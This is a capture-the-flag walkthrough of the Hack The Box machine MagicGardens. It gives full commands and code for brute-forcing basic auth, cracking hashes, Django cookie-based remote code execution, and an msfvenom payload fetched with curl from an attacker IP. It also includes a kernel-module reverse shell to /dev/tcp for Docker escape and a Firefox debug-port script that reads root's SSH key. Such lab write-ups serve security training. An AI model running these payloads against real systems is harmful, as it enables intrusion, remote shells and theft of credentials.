---
date: 2025-02-04
categories: [CTF, HTB]
title: "HTB - MagicGardens"
tags: ['docker breakout', 'hashcat', 'hydra', 'linux', 'linux capabilities', 'nmap', 'privilege escalation', 'python', 'rce', 'reverse shell', 'sqli']

description: "MagicGardens - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# HTB - MagicGardens

NMAP

![image1](../resources/8eeb035bd2fa424d988237744b3b438a.png)
 

![image2](../resources/1a73761b272748878115d074482a814a.png)

Add magicgardens.htb to /etc/hosts

- **<u>Port 80:</u>**

`http://magicgardens.htb/admin/login/?next=/admin/`


![image3](../resources/1090b253fea2428fa3c302e545ce0023.png)

- **<u>Port 5000:</u>**
https://magicgardens.htb:5000/v2/


![image4](../resources/5b27ccb219c343cd91ba0f749349e2b3.png)


![image5](../resources/083e060aded449a282df066afda5ce5f.png)

- **<u>Port 25:</u>**

![image6](../resources/952f7ea5c7e94e22a3e8b445ea4017e1.png)

Enumerate SMTP:


![image7](../resources/de7fd63122054f209d40c4533db6b0e5.png)

Found user: **alex**

- Register a user and login

- In the Subscriptiontab we can Upgrade our subscription

- Enter all details just as they are there, ie. 1111-2222-3333-4444

- Capture the request in burp:

![image8](../resources/24a7746b0ad2469f95bb43a1e2ad0d14.png)

- We can see all the details as well as a **bank=** parameter which calls to a Domain name for the bank

- Create a flask server script - that will handle the POST and GET request and return a 200 OK response and JSON

![image9](../resources/dd504f7d068d45c3a7c82e13800dc3e7.png)

```python
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/', methods=['GET'])
def handle_get():
    return "Hey! Here is your bank", 200, {'Content-Type': 'text/html'}

@app.route('/api/payments/', methods=['POST'])
def handle_post():
    post_data = request.get_json()

    if not post_data:
        return jsonify({"status": "400", "message": "Bad Request"}), 400

    cardnumber = post_data.get('cardnumber')
    cardname = post_data.get('cardname')

    response_content = {
        "status": "200",
        "message": "OK",
        "cardnumber": cardnumber,
        "cardname": cardname,
    }

    return jsonify(response_content), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0')  # Listens on all interfaces

```

- Run the flask server:

![image10](../resources/858b675522f0480296ce5fa9bcb93417.png)

- Edit the Burp request with Kali IP and Flask port:

![image11](../resources/c0682267765544ada8d58eb4b6d0b933.png)

- Send

- We have a subscription:

![image12](../resources/d8a75b9896604a1990162f8e888f1e17.png)

- After we got the subscription - we get an email from morty:


![image13](../resources/c9c60a4643714f37b61eed6547ed83cb.png)

- Found user alex through SMTP:

![image7](../resources/de7fd63122054f209d40c4533db6b0e5.png)

- The API on port 5000 uses basic-auth over HTTPS:
Which means the base64 translates to **username:password**


![image14](../resources/7681ae1c4ce348e0a6397786acf17425.png)


![image15](../resources/f1428a2d68ca4d0db993339e0ada88da.png)

- We can bruteforce this with Hydra:

```bash
hydra -I -l alex -P /usr/share/wordlists/rockyou.txt "magicgardens.htb" https-get "/v2/" -s 5000

```

![image16](../resources/6563180341ae4208bdc2a63b3a2359ff.png)

We get **alex:diamonds**

- We can now authorize (using the base64 of the creds):

![image17](../resources/d369ab042f4f4146b4cc22339525e396.png)

- From the Burp response - we can see Docker Registry being used (as well as on the NMAP scan):

![image18](../resources/044e6ca5f9004f8f83577ca067539169.png)

<https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry>

<https://logicbomb.medium.com/docker-registries-and-their-secrets-47147106e09>

- Tried to FUZZ the endpoint:

```bash
ffuf -u " https://magicgardens.htb:5000/v2/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -H 'Authorization: Basic YWxleDpkaWFtb25kcw==' -H 'Cookie: csrftoken=XvaGn6Z10eWZENLXj1Q9j7VIuHcirTiY; sessionid=.eJxrYJ0awQABtVM0ejjLM4sz4nMyi0um9DBM6eEBc5PzS_NKUoumZDD1cCYnFpVA5IE8HjAPSZqruDQpPjG5JDM_b0oPi1tiZs6UUj0AnTMkBg:1s92TI:4SVKEMoje0gSFSmJg6j-LJrBAOQ-YB3chrMB3f3VBco' -fs 0

```

![image19](../resources/431898721e1d4650ab40c8086c58d846.png)


![image20](../resources/c96d13bde878438c8c7c244e476c8eea.png)

- We can use this tool to view and dump the remote repository:
<https://github.com/Syzik/DockerRegistryGrabber>


![image21](../resources/56cc519bfe29490bab5dc2c564a2dd6f.png)

- More enum:
**GET /v2/\<repo-name\>/tags/list**


![image22](../resources/a1f54dd12a534375bc5f5a98744b7051.png)

- Extract all the images:

```bash
for file in *.tar.gz; do
    tar -xzf "$file" -C extracted/
done
```
- There doesn't seem to be much on there
  - I found ./etc/**ImageTragick6** (vulnerable to ImageTragick)

![image23](../resources/cf38940898c44b358fc02a3da4fe625a.png)
- And also it seems this docker is running the django app

![image24](../resources/05e681278e484e70b8b88af970098eff.png)

- If we go to ./usr/src/app:

![image25](../resources/3e9ad50bd1f749b3916802b7345804e2.png)

- In the db.sqlite3 file, we get a hash (from a registration form it seems):

![image26](../resources/3b19f9fa3acf420ba6560a0901470225.png)

- And this is crackable with hashcat:

```bash
hashcat -a 0 -m 10000 admin_hash.txt /usr/share/wordlists/rockyou.txt

```

![image27](../resources/222a373302694529bd246501e3ad25a4.png)

username: **morty**

email: **morty@mail.htb**

password: **jonasbrothers**

- With morty creds we can SSH into the actual magicgardens.htb machine:

![image28](../resources/2d7df6fd71144aeda1fae0cc20420c16.png)

- Run linpeas

- We get the unintended route with:

![image29](../resources/9180da8e54fa4b76b4fb87923c05665b.png)

- We can see the users:

![image30](../resources/499c1fb709ae417d8d687148e2381a29.png)

- Alex and root have mail accounts:

![image31](../resources/72688c6bccdf43379df4b41dfe019fd5.png)

- Custom (non-default) binaries can be installed in either **/opt** or **/usr/local/bin**

![image32](../resources/34ab6352626e4ca5ad4e1c56b2411fee.png)

- Here we see a binary called "harvest" running as root:

![image33](../resources/85844283eb9f4f1f9bb396faa2deca34.png)


![image34](../resources/4662e34a18a148f4a9bf403ed9b05847.png)


![image35](../resources/f52e0f2a5c184ce69fb4be9ad049eded.png)

- We got the /admin site for the django admin console (from the directory bruteforcing)

- We can log in with **morty : jonasbrothers**

![image36](../resources/3253dd6747a44b9d9b2fad01a29bc684.png)

- Maybe ImageTragick here with the file upload?


![image37](../resources/1e62b1a19a8445c497696087a129aba8.png)

- ImageTragick was a dead end, so decided to search for Django RCE code and found this:
<https://github.com/IR4N14N/Django-RCE>

- In the extracted image files - we get the .env file - which holds the SECRET_KEY:

![image38](../resources/9a1ef6b6bdb34b8fbab89c00463d363e.png)

- Copy the session token:

![image39](../resources/1ea2aafa68294499b072190b87edd4ba.png)

- Using the exploit above:
Copy both these values into the settings.json file of the exploit


![image40](../resources/5c5d05e412584afea503dadd9e7ef9b9.png)

- Edit Django_RCE.py with our RCE code

![image41](../resources/0ee4a3edd97f4403b90697c4b9ff4721.png)

- Run the exploit:

![image42](../resources/de6c142cced84c9986753fb46ce656c3.png)

- Set up Python server

- Copy malicious cookie into the browser
- Refresh page

- We got RCE

![image43](../resources/f9cbb431e71e402aa8b8951530d177e9.png)

- Get shell:

- Create msfvenom:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.82 LPORT=9001 -f elf -o reverse.elf
```

- Setup python server
- Setup listener

- Add line to exploit.py file:

`curl http://10.10.14.82:8001/reverse.elf -o /tmp/rev.elf && chmod +x /tmp/rev.elf && /tmp/rev.elf`


![image44](../resources/c0f6f7d3de5d46d4b53ec8a6083a1711.png)

- Got shell:

![image45](../resources/8b1c099b740643febbde4fe1162452a6.png)

- When we run hostanme - we can see we're in a docker:

![image46](../resources/8c1d1d92eba0451b8751213c4ac571a9.png)

As well as in root / - we get .dockerenv


![image47](../resources/011da844eac04961b62e84dc5c707d59.png)

When a container is running with cap_sys_module capability it can inject kernel modules into the running kernel of the host machine.

The isolation is done on the OS level not the kernel/hardware level and the containers use docker runtime engine to interact with the host machine kernel eventually.

In this lab, you will found that the container is running with additional cap_sys_module capability which is not added normally when you start the container with default arguments

How to do it:

[https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_module:~:text=nc%20172.17.0.1%205600-,CAP_SYS_MODULE,-CAP_SYS_MODULE](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_module:~:text=nc%20172.17.0.1%205600-,CAP_SYS_MODULE,-CAP_SYS_MODULE)

- Atm we are root in the docker container - so the only logical thing to do would be to try and break out of the docker and into the host machine

- Checking capabilities:

```bash
capsh --print

```

![image48](../resources/fa05c9af920942369bf4b3f5737c14cb.png)

- We see the cap_sys_module is set

**<u>To exploit:</u>**
- First look at the current modules available:

```bash
ls /lib/modules

```

![image49](../resources/581294ccd8e34300ab37e52cbcabc90b.png)

By default, modprobe command checks for dependency list and map files in the directory /lib/modules/\$(uname -r)

In order to abuse this, lets create a fake lib/modules folder:

```bash
mkdir lib/modules -p

cp -a /lib/modules/6.1.0-20-amd64/ lib/modules/$(uname -r)

```
- Create the **reverse-shell.c** file:

```c
#include <linux/kmod.h>
#include <linux/module.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {
    "/bin/bash",
    "-c",
    "bash -i >& /dev/tcp/10.10.14.82/4444 0>&1",
    NULL
};

static char* envp[] = {
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    NULL
};

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);

```

- Create the **Makefile**:
(The blank char before each make word in the Makefile must be a **tab**, not spaces!)

```bash
obj-m += reverse-shell.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

- Upload both to the docker container

- Compile the kernel module:

```bash
make

```

![image50](../resources/329e5bf82dbb4386a163b283c4b50c02.png)


![image51](../resources/9782752afd9a4dd1b42be9cdd07b0f40.png)

- Copy to the fake lib folder:

```bash
cp reverse-shell.ko lib/modules/$(uname -r)/

```
- Set up nc listener:

```bash
rlwrap -cAr nc -lvnp 4444

```
- In the current folder (where the Makefile is) run:

```bash
insmod reverse-shell.ko

```
- Shell as root on the host system:

![image52](../resources/574dff7df9324ab7a5202a90b5737fd1.png)

- And in /home/alex we can find user.txt

- We can grab root's SSH private key and SSH in:

![image53](../resources/50c90e16e98541f5adc96a3f111d2ab4.png)

```bash
ssh -i id_rsa root@magicgardens.htb
cat root.txt

```
**<u>Unintended route - Firefox Debug port - Websocket</u>**

Explains this:

[https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)

Also code for Chrome remote debug LFI:

[https://gist.github.com/pich4ya/5e7d3d172bb4c03360112fd270045e05](https://gist.github.com/pich4ya/5e7d3d172bb4c03360112fd270045e05)

- With morty's creds we can login via SSH

- When we look at processes with ps -aux:

![image54](../resources/f4c2d935e0904ecebd30486d4a178e23.png)


![image55](../resources/d842b488f92346f19605e3352e90094b.png)

This command line is used to start a browser instance of Firefox Extended Support Release (Firefox ESR) and configure it to support automated testing, especially when used in conjunction with Selenium WebDriver and Marionette

**<u>The following is an explanation of each parameter:</u>**
- **firefox-esr**: This is the executable file of Firefox ESR. Firefox ESR is a version of Firefox for businesses and organizations that need to support older versions for longer
- **–marionette**: Enable the Marionette driver, which is Firefox's WebDriver implementation. It allows controlling Firefox through Selenium or other WebDriver-compatible automation tools.
- **–headless**: Launch Firefox in headless mode, which means the browser will not display a graphical user interface (GUI). This is typically used for automated testing or running a browser on a server without a graphical interface.
- **–remote-debugging-port 54201**: Set the remote debugging port to 54201. Through this port, you can use Firefox developer tools for remote debugging, or communicate with other tools (such as Selenium Grid).
- **–remote-allow-hosts localhost**: Allow remote connections from localhost. This is typically used in conjunction with --remote-debugging-port to ensure that only connections from localhost can access the debugging port.
- **-no-remote**: Prevent Firefox from trying to open an already running instance. In an automated testing environment, this option is important because it ensures that you have control over a completely new browser instance.
- **-profile /tmp/rust_mozprofileGfH5kl**: Use the specified profile folder to start Firefox. In this example, the profile folder is located at /tmp/rust_mozprofileba09VC. This allows you to configure specific settings, extensions, bookmarks, etc. for a specific browser instance.

As you can see, since root is running Firefox with remote debugging enabled, there is definitely a vulnerability in this way. The CDP protocol allows opening pages at any URL, including "file://". It also allows capturing screenshots of the browser window, which combined, can obtain any PNG file

- This can be exploited with:

- Upload chisel to the target
- Run chisel server
- Create the following script (below)
Change the file to read, to whatever you want:

/root/root.txt

/home/alex/user.txt

/root/.ssh/id_rsa

- Run script.py through proxychains

![image56](../resources/d6b0829f490e4db09437fd5ddd7719aa.png)

- And we get an image with the data:

![image57](../resources/dc26612131f44c36a7c4f7d03366891b.png)

**<u>Script.py:</u>**

```python
import json
import requests
import websocket
import base64

# Set debugger address
debugger_address = 'http://localhost:53371'

# Get available debugging tabs
response = requests.get(f'{debugger_address}/json')
tabs = response.json()

# Replace IP to ensure local connection
web_socket_debugger_url = tabs[0]['webSocketDebuggerUrl'].replace('127.0.0.1', 'localhost')
print(f'Connect to URL: {web_socket_debugger_url}')

# Establish WebSocket connection
ws = websocket.create_connection(web_socket_debugger_url, suppress_origin=True)

# Create a new target (e.g., open a file-based tab)
command = json.dumps({
    "id": 5,
    "method": "Target.createTarget",
    "params": {
        "url": "file:///home/alex/user.txt"
    }
})
ws.send(command)
target_id = json.loads(ws.recv())['result']['targetId']
print(f'Target ID: {target_id}')

# Attach to the created target
command = json.dumps({
    "id": 6,
    "method": "Target.attachToTarget",
    "params": {
        "targetId": target_id,
        "flatten": True
    }
})
ws.send(command)
session_id = json.loads(ws.recv())['params']['sessionId']
print(f'Session ID: {session_id}')

# Capture a screenshot of the attached session
command = json.dumps({
    "id": 7,
    "sessionId": session_id,
    "method": "Page.captureScreenshot",
    "params": {
        "format": "png"
    }
})
ws.send(command)
result = json.loads(ws.recv())

# Check and save the screenshot
if 'result' in result and 'data' in result['result']:
    print("Success: File reading complete")
    with open("exploit.png", "wb") as file:
        file.write(base64.b64decode(result['result']['data']))
else:
    print("Error: File reading failed")

ws.close()

```